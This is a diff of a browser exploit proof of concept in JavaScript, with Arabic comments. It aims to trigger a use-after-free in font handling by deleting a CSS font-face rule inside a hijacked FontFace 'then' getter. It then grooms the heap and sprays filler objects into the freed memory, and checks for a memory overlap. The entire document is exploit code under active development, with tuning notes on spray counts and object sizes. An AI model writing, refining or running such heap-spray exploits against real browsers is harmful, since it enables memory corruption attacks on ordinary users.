@@ -1,67 +1,59 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <style id="fontStyle">
-        @font-face { font-family: 'TargetFont'; src: url(nonexistent.woff); }
-    </style>
-</head>
-<body>
-    <div id="status">Status: Preparing...</div>
+<script>
+    let sprayedObjects = [];
+    let noise = [];
 
-    <script>
-        const status = document.getElementById('status');
-        let sprayedObjects = [];
-
-        // Adjusted structure to match likely CSSFontFace size (128-byte block)
-        function createFillerObject() {
-            return {
-                a: 0x41414141, b: 0x42424242, c: 0x43434343, d: 0x44444444,
-                e: 0x45454545, f: 0x46464646, g: 0x47474747, h: 0x48484848
-            };
+    // 1. الترتيب المسبق (Defrag): خلق فجوات في الذاكرة
+    function preGroom() {
+        for (let i = 0; i < 5000; i++) {
+            noise.push(new Array(0x10).fill(0x41414141)); 
         }
-
-        function triggerUAF() {
-            status.innerHTML = "Status: Triggering UAF...";
-            
-            let font = new FontFace('TargetFont', 'local(Arial)', { unicodeRange: 'U+0041' });
-            document.fonts.add(font);
-            
-            Object.defineProperty(FontFace.prototype, 'then', {
-                get() {
-                    // 1. Delete to free memory
-                    document.getElementById('fontStyle').sheet.deleteRule(0);
-                    
-                    // 2. Aggressive Spray: Fill the freed slot immediately
-                    for (let i = 0; i < 5000; i++) {
-                        sprayedObjects.push(createFillerObject());
-                    }
-                    return undefined;
-                }
-            });
-
-            font.load();
+        // مسح نصف الفجوات لترك أماكن فارغة (Holes) جاهزة للكائن الذي سنحذفه
+        for (let i = 0; i < 2500; i += 2) {
+            noise[i] = null; 
         }
+    }
 
-        function verifyExploit() {
-            status.innerHTML = "Status: Verifying...";
-            let overlap = false;
-            
-            // Check if any object has been overwritten (Structure ID or data change)
-            for (let i = 0; i < sprayedObjects.length; i++) {
-                if (sprayedObjects[i].a !== 0x41414141) {
-                    overlap = true;
-                    status.innerHTML = "SUCCESS: Overlap detected at index " + i;
-                    break;
-                }
-            }
-            
-            if (!overlap) status.innerHTML = "Status: Buffers intact. (Try increasing spray count or padding)";
-        }
-
-        window.onload = () => {
-            setTimeout(triggerUAF, 500);
-            setTimeout(verifyExploit, 2000);
+    function createExploitObject() {
+        // حجم المصفوفة هنا يحدد حجم الكائن في الذاكرة بدقة (128-byte block target)
+        return {
+            padding: new Array(16).fill(0x1337), // تلاعب بحجم الـ Padding
+            marker: 0xDEADBEEF
         };
-    </script>
-</body>
-</html>
+    }
+
+    function triggerUAF() {
+        preGroom(); // ترتيب الذاكرة أولاً
+
+        let font = new FontFace('TargetFont', 'local(Arial)', { unicodeRange: 'U+0041' });
+        document.fonts.add(font);
+
+        Object.defineProperty(FontFace.prototype, 'then', {
+            get() {
+                document.getElementById('fontStyle').sheet.deleteRule(0);
+                
+                // الحقن الفوري: Spray مكثف
+                for (let i = 0; i < 2000; i++) {
+                    sprayedObjects.push(createExploitObject());
+                }
+                return undefined;
+            }
+        });
+
+        font.load();
+    }
+
+    // تحقق من الذاكرة
+    function verify() {
+        let overlap = false;
+        for (let i = 0; i < sprayedObjects.length; i++) {
+            if (sprayedObjects[i].marker !== 0xDEADBEEF) {
+                overlap = true;
+                console.log("SUCCESS: Memory overlap at " + i);
+                break;
+            }
+        }
+        if (!overlap) console.log("Status: Still intact. Need to tune Array size.");
+    }
+
+    window.onload = () => { setTimeout(triggerUAF, 1000); setTimeout(verify, 3000); };
+</script>
